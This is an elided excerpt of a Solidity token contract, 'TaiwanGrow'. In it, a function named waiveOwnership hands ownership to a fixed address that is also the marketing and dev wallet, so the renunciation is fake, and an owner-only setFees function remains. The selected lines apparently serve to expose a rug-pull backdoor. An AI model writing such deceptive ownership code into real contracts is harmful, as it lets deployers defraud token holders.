...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x5D0a7641fF42201273bcb956B01C1e15B0C858e0);
    }
...
contract TaiwanGrow is Context, IERC20, Ownable {
    ...
    string private _name = "TaiwanGrow";
    string private _symbol = "TG";
    uint8 private _decimals = 9;

    address payable public marketingWallet = payable(0x5D0a7641fF42201273bcb956B01C1e15B0C858e0);
    address payable public devWallet = payable(0x5D0a7641fF42201273bcb956B01C1e15B0C858e0);
    ...
    uint256 public _maxWallet =   35000000 * 10**_decimals;      
    ...
    function setFees(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newDevelopmentTax) external onlyOwner() {
